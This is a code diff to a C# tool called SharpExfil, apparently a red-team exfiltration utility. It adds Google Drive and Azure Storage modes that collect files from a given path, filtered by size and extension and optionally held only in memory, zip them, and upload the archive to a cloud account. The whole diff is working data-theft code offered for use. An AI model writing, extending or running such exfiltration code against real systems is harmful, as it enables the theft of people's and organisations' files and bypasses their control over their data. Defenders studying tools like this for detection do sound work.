@@ -18,10 +18,42 @@ namespace SharpExfil
 
         }
 
-
-        public static async Task<int> AzureStorageExfil(AzureStorageOptions oneDriveOptions)
+        public static async Task<int> GoogleDriveExfil(GoogleDriveOptions googleDriveOptions)
         {
-            //More to come :)
+            var fileHandlingModule = new FileHandling(googleDriveOptions.FilePath, googleDriveOptions.FileSize, googleDriveOptions.FileExtensions, googleDriveOptions.MemOnly);
+
+            var oneDriveModule = new GoogleDrive(googleDriveOptions);
+
+            var zipFileData = fileHandlingModule.PrepareZipFile();
+
+            if (zipFileData.entryCount == 0)
+            {
+                Console.WriteLine("[+] No files compressed, check your size and extension filter!");
+                return 0;
+            }
+
+            await oneDriveModule.UploadFile(zipFileData.zipStream, zipFileData.newFileName);
+
+            return 0;
+
+        }
+
+
+        public static async Task<int> AzureStorageExfil(AzureStorageOptions azureStorageOptions)
+        {
+            var fileHandlingModule = new FileHandling(azureStorageOptions.FilePath, azureStorageOptions.FileSize, azureStorageOptions.FileExtensions, azureStorageOptions.MemOnly);
+
+            var azureStorageModule = new AzureStorage(azureStorageOptions.ConnectionString);
+
+            var zipFileData = fileHandlingModule.PrepareZipFile();
+
+            if (zipFileData.entryCount == 0)
+            {
+                Console.WriteLine("[+] No files compressed, check your size and extension filter!");
+                return 0;
+            }
+
+            await azureStorageModule.UploadFile(zipFileData.zipStream, zipFileData.newFileName);
 
             return 0;
 
@@ -48,11 +80,13 @@ namespace SharpExfil
 
         public static void Main(string[] args)
         {
-            CommandLine.Parser.Default.ParseArguments<OneDriveOptions, AzureStorageOptions>(args)
+            CommandLine.Parser.Default.ParseArguments<OneDriveOptions, GoogleDriveOptions, AzureStorageOptions>(args)
               .MapResult(
                 (OneDriveOptions opts) => OneDriveExfil(opts).GetAwaiter().GetResult(),
+               // (AzureStorageOptions opts) => AzureStorageExfil(opts).GetAwaiter().GetResult(),
+               // (DropBoxOptions opts) => DropBoxExfil(opts).GetAwaiter().GetResult(),
+                (GoogleDriveOptions opts) => GoogleDriveExfil(opts).GetAwaiter().GetResult(),
                 (AzureStorageOptions opts) => AzureStorageExfil(opts).GetAwaiter().GetResult(),
-                (DropBoxOptions opts) => DropBoxExfil(opts).GetAwaiter().GetResult(),
                 errs => 1);
         }
     }
